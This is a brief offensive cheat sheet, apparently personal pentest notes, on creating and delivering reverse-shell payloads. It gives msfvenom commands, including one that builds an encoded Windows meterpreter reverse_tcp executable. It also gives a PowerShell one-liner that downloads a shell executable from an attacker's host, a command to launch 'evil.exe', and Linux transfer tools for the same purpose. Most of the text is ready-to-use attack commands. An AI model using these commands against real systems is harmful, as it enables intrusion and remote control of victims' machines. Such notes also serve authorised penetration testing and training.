# list payloads
`msfvenom --list payloads`
# examples
- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe`
- `msfvenom -p <os>/<arch>/<type>/<connectivity> -f <filetype> -o <filename> LHOST=<listen-IP> LPORT=<listen-port>`

# Download payload
## windows
`powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`

`start-process evil.exe`

### linux
- wget
- curl
- scp
- ftp